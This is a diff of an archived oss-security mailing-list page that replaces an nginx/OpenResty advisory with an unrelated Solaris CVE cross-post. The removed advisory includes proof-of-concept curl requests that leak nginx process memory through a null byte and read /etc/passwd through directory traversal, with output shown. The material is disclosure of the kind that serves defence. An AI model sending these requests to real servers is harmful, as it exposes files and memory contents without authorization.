@@ -1,156 +1,39 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/03/18/1
-Message-ID: <c429fb15-5af8-e56f-01ec-674b10ec3e7b@securityvulns.ru>
-Date: Wed, 18 Mar 2020 16:10:32 +0300
-From: Vladimir Dubrovin <vlad@...urityvulns.ru>
-To: oss-security@...ts.openwall.com
-Subject: Insecure implementation of OpenResty ngx.req.set_uri + memory content leak in nginx.
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/01/20/2
+Message-ID: <9DA63DD0-2736-42F2-9576-65102276E985@contoso.com>
+Date: Mon, 20 Jan 2020 10:35:26 +0000
+From: Marco Ivaldi <marco.ivaldi@...iaservice.net>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE-2020-2656, CVE-2020-2696 - Multiple vulnerabilities in Oracle Solaris
 Content-Type: text/plain; charset=utf-8
 
-OpenResty is LUA engine for nginx reverse proxy.
+Dear oss-security,
 
-Affected versions: tested on nginx-1.17.5 and openresty-1.15.8.2 on
-ubuntu 18.04
+As suggested by Solar Designer, I’m cross-posting two recent advisories for the following vulnerabilities, fixed in Oracle's Critical Patch Update (CPU) of January 2020:
 
-Two independent problems were identified in OpenResty and nginx,
-potentially leading to different security vulnerabilities: Header
-injection/CRLF injection, directory traversal/local file read,
-restrictions bypass, memory content disclosure in some nginx + openresty
-configurations:
+CVE-2020-2656 - Low impact information disclosure via Solaris xlock
+"A low impact information disclosure vulnerability in the setuid root xlock binary distributed with Solaris may allow local users to read partial contents of sensitive files. Due to the fact that target files must be in a very specific format, exploitation of this flaw to escalate privileges in a realistic scenario is unlikely."
 
-1. There is a bug in nginx "rewrite" implementation. It can disclose the
-fragment of the process memory with 301/302 HTTP reply if rewrite string
-contains ASCII 0 character. Within nginx itself rewrite string is a
-static configuration option, and is not supposed to be manipulated
-externally.
+CVE-2020-2696 - Local privilege escalation via CDE dtsession
+"A buffer overflow in the CheckMonitor() function in the Common Desktop Environment 2.3.1 and earlier and 1.6 and earlier, as distributed with Oracle Solaris 10 1/13 (Update 11) and earlier, allows local users to gain root privileges via a long palette name passed to dtsession in a malicious .Xdefaults file."
 
-2. OpenResty implements ngx.req.set_uri() via raw rewrite in nginx
-without any additional filtering or normalization. If used with
-untrusted input it can lead to CRLF/header injection, directory
-traversal/local file read, restrictions bypass. Due to (1) it can also
-lead to memory content disclosure.
+Please find the advisories attached to this email.
 
+For further details and some background information on my recent vulnerability research project focused on Oracle Solaris, please refer to:
+https://techblog.mediaservice.net/2020/01/local-privilege-escalation-via-cde-dtsession/
+https://techblog.mediaservice.net/2019/10/local-privilege-escalation-on-solaris-11-x-via-xscreensaver/
+https://techblog.mediaservice.net/2019/05/raptor-at-infiltrate-2019/
 
-Fix:
-==============
+Regards,
 
-As of now, there is no fix for ngx.req.set_uri(), this function must be considered as potentially unsafe.
-
-Recommendations:
-==============
-
-Avoid usage of ngx.req.set_uri() with untrusted input or implement strict input filtering.
+-- 
+Marco Ivaldi, Offensive Security Manager
+CISSP, OSCP, QSA, ASV, OPSA, OPST, OWSE, LA27001, PRINCE2F
+@Mediaservice.net S.r.l. con Socio Unico
+https://www.mediaservice.net/
+Tel: +39 011 19016595 | Fax: +39 011 3246497
 
 
-Timeline:
+View attachment "2020-01-solaris-xlock.txt" of type "text/plain" (5327 bytes)
 
-==============
-
-21.03.2019 - Memory content leak reported to Mail.Ru team via H1 by @maxarr in https://hackerone.com/reports/513236
-22.03.2019 - Memory content leak is mitigated on Mail.Ru side
-05.11.2019 - Problem additionally researched by Denis 'KPEBETKA' Denisov and Nikolay Ermishkin of Mail.Ru Security Team, root cause tracked to nginx+openresty.
-07.11.2019 - Reported to nginx team
-08.11.2019 - Acknowledged by nginx team
-13.12.2019 - nginx team reported back the issue is not tracked as a security bug in nginx, secure rewrite will not be provided by nginx API
-16.12.2019 - memory leak bug fixed in nginx master branch
-https://hg.nginx.org/nginx/rev/02a539522be4
-https://github.com/nginx/nginx/commit/a5895eb502747f396d3901a948834cd87d5fb0c3#diff-75916b11f3e6d45e713a6aa9c97cf315
-17.12.2019 - reported to OpenResty team
-17.12.2019 - acknowledged by OpenResty team
-18.03.2020 - disclosed
-
-
-Details:
-
-==============
-
-This configuration demonstrates memory content leak in nginx:
-
-Vulnerable config (^@ is a null byte)
-
-location ~ /memleak {
-    rewrite ^.*$ "^@...fasdfasdfasdfasdfasdfasdfasdfasdfasdfasdasdf";
-}
-
-location / {
-    root html;
-    index index.html index.htm;
-}
-
-curl localhost:8337/memleak -vv
-...
-Location: http://localhost:8337/WjWj
-...
-
-WjWj – is a random peace of memory, usual includes parts of other requests
-
-vulnerable code:
-
-https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L77
-
-last = ngx_http_map_uri_to_path(r, &path, &root, 0);
-
-Doesn't handle location with null byte properly
-
-https://github.com/nginx/nginx/blob/5a2ce3f4ee55eb8903aa9481deaaf402d5a2e805/src/http/ngx_http_core_module.c#L1846
-
-last = ngx_cpystrn(last, r->uri.data + alias, r->uri.len - alias + 1);
-
-Writes only null byte to last, not the whole r->uri.data
-
-https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L161
-
-if (!clcf->alias && clcf->root_lengths == NULL && r->args.len == 0) {
-
-It's important to get into this conditional branch to get memory leak
-
-https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L188
-
-r->headers_out.location->value.len = len;
-
-location length more than was really written, location ends with random
-piece of memory (usually includes part of other HTTP requests).
-
-Example of configuration vulnerable to  memory leak with
-https://github.com/openresty/lua-nginx-module:
-
-location ~ /memleak {
-    rewrite_by_lua_block {
-        ngx.req.read_body();
-        local args, err = ngx.req.get_post_args();
-        ngx.req.set_uri( args["url"], true );
-    }
-}
-
-location / {
-    root html;
-    index index.html index.htm;
-}
-
-curl localhost:8337 -d "url=%00asdfasdfasdfasdfasdfasdfasdfasdf" -vv
-...
-Location: http://localhost:8337/WjWj
-...
-
-Example of configuration vulnerable to directory traversal with
-https://github.com/openresty/lua-nginx-module
-
-location ~ /rewrite {
-    rewrite ^.*$ $arg_x;
-}
-
-location / {
-    root html;
-    index index.html index.htm;
-}
-
-curl localhost:8337/rewrite?x=/../../../../../../../etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-...
-
-
--- Vladimir Dubrovin
-
-
+View attachment "2020-02-cde-dtsession.txt" of type "text/plain" (4331 bytes)
